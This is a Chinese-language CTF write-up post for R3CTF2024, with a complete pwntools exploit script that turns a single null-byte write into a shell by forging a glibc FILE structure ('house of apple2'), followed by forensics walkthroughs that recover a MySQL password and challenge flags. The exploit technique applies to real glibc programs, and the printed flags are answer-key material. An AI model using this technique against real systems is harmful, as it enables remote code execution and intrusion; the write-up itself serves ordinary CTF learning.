---
title: R3CTF2024 WP - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18447764
source: 博客园 - 渗透测试中心
date: 2024-10-06
fetch_date: 2025-10-06T18:49:42.520430
---

# R3CTF2024 WP - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [R3CTF2024 WP](https://www.cnblogs.com/backlion/p/18447764 "发布于 2024-10-05 12:37")

## 一、PWN

### 1.Nullullullllu

在直接给 libc\_base 的情况下，一次任意地址写 \x00 。

直接修改 *IO\_2\_1\_stdin* 的 \_IO\_buf\_base 末尾为 \x00 ，那么 \_IO\_buf\_base 就会指向 *IO\_2\_1\_stdin* 的 \_IO\_write\_base，接下来就是利用 getchar 函数触发写操作修改 *IO\_buf\_base* 为 *IO\_2\_1\_stdout* ，再次利用 getchar 函数触发写操作写 apple2 进 stdout ，printf 函数执行时候会触发 appl2 get shell。

exp

```
from pwn import *
from struct import pack
from ctypes import *
import base64
from subprocess import run
#from LibcSearcher import *
from struct import pack
import tty

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = remote('ctf2024-entry.r3kapig.com', 30371)
#p = remote('127.0.0.1', 9999)
elf_patch = './chall'
#p = process(elf_patch)
elf = ELF(elf_patch)
libc = ELF('./libc.so.6')

sla(b'> ', b'1')
rl(b'0x')
libc_base = int(r(12), 16)# + 0x6d80

environ = libc_base + libc.sym['__environ']
system, binsh = get_sb()
stdin = libc_base + libc.sym['_IO_2_1_stdin_']
stdin_IO_buf_base = stdin + 7*8
stdin_old_value = stdin + 0x83
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
stderr = libc_base + libc.sym['_IO_2_1_stderr_']

# step 2 : printf -> stdout -> house of apple2
system, binsh = get_sb()
_IO_wfile_jumps = libc_base + 0x202228

base_addr = stdout

fake_io = b'  sh;\x00\x00\x00'
fake_io = fake_io.ljust(0x68, b'\x00')
fake_io += p64(system)
fake_io = fake_io.ljust(0x88, b'\x00')
fake_io += p64(base_addr + 0x5000) # _lock
fake_io += p64(0)*2
fake_io += p64(base_addr)
fake_io = fake_io.ljust(0xd8, b'\x00')
fake_io += p64(_IO_wfile_jumps - 0x20)
fake_io = fake_io.ljust(0xe0, b'\x00')
fake_io += p64(base_addr)

sla(b'> ', b'2')
sla(b'Mem: ', hex(stdin_IO_buf_base))

#debug('b *$rebase(0x12c3)')

sa(b'> ', p64(stdin_old_value)*3 + p64(base_addr) + p64(base_addr + len(fake_io) + 1))

sleep(1)
sl(fake_io)

lg('libc_base', libc_base)

inter()
pause()
```

## 二、Forensic

### 1.TPA 01

e01镜像 直接丢进火眼 分析出个嵌套证据

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123634198-863951153.jpg)

其实做这个题的时候分析过程还挺复杂的 感觉想的过于复杂了 归其原因还是经验太少 我甚至仿真起来了

翻文件夹的时候找到wsl 在结合嵌套证据 感觉预期解应该是要把这个系统恢复出来

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123635438-1986591366.jpg)

但是好在有取证工具 不用恢复出来也可以做 下面就是由于我翻文件系统不仔细发现的另一种途径

010直接把密文翻出来了

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123636208-712348146.jpg)

但是在火眼里面直接能看到 还能看到一个关于密钥的提示

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123636839-420522205.png)

```
key：
Do you like watch videos on youtube?Something fun there:https://www.youtube.com/@d3f4u1t-lolol

F14G：
Hi players,welcome !Ops,what's that?2d422fc7f2c628c55520984c0673964eb5454dea72f79b1022a34728294c5bf8I guess u need a key to decrypt it.SELECT something FROM somewhere with the windows10 lol~
```

根据提示 `SELECT something FROM somewhere` 想到应该和sql语句有点关系

先看一下key里面提到的视频

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123637427-1989273656.jpg)

有个字符串 提出来看看

```
0x6d617962652075206e6565642c746861742773206e6f74206162736f6c7574650a726f6f743a5040357357307264466f7255

maybe u need,that's not absolute
root:P@5sW0rdForU
```

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123638116-1629312263.png)

给了个密码 尝试登陆mysql 成功登陆

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123638719-878532988.png)

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123639290-416150928.png)

```
select * from secret;
```

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123640012-298815255.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123640629-927545123.jpg)

FFD8的头 一眼jpg图片 保存下来 给出了AES解密的key

其实这里也可以用一个项目[ibd2sql](https://github.com/ddcw/ibd2sql)来解密数据库`secret.ibd`也可以

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123641303-237871512.png)

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123642062-415239806.jpg)

### 2.TPA 02

两部分 一个是找攻击者的手机号码 一个是找Peggy的登陆密码

先看流量 直接追踪tcp流 在第31个流 找到login登录页面

![image-20240611170304555](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123642753-1256505198.png)

第一段flag从安卓手机存储手机短信的地方找

![image-20240611170358276](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123643464-906904314.png)

再看给的手机文件夹 直接用火眼分析 分析出两个手机号

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123644087-129601060.png)

根据语境 可以得知是15555215556这个号码应该是Peggy的同事 来询问Peggy是否也收到了钓鱼信息

那下面的15555215558 应该就是攻击者的手机号码 直接组合起来

```
r3ctf{15555215558_l0v3_aNd_peace}
```

## 三、Misc

### 1.Blizzard CN Restarts

利用shadoweditor

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123644830-198434124.jpg)

![image-20240611170732676](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123645600-847968600.png)

![image-20240611170748000](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241005123646367-584668325.png)

### 2.hideAndSeek

```
Ben is a superpower who loves playing hide and seek. He can teleport to anywhere to no one can find him, ...